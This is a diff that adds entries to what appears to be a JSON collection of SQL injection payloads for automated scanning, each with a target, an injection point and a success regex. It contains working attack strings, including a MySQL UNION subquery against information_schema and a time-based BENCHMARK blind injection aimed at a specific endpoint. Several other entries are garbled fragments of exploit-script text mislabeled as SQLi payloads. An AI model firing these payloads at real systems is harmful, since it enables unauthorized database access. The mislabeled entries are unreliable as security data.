@@ -81669,5 +81669,93 @@
       "expected_status_code": 200,
       "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
     }
+  },
+  {
+    "payload_id": "OWP-474655",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$sql data:\\n\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-474659",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "MySQL",
+    "injection_point": "query_parameter",
+    "payload_string": ") union all select (SELECT CASE WHEN ($sql) then 1 else 1*(select table_name from information_schema.tables) end)#",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-474661",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "ue[${sql}]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-474665",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "MySQL",
+    "injection_point": "query_parameter",
+    "payload_string": "what=getpdf&table=_blocked_iplist+WHERE+IF((<sql>),BENCHMARK($bmark_numb,MD5(0x616161)),1)=1 --",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-474667",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$url/cache/backup/$dir/${file}_1.sql",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-474668",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\\n\\tLooks ok, check $prot://$host${path}cache/backup/$dir/${file}_1.sql\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-474669",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$prot://$host${path}cache/backup/$dir/${file}_1.sql",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
+  },
+  {
+    "payload_id": "OWP-474680",
+    "vulnerability_category": "Injection (SQLi)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "calendar.php?yearID=2011&monthID=12&dayID=SQL",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "sql|syntax|mysql|oracle|postgres|sqlite|odbc"
+    }
   }
 ]
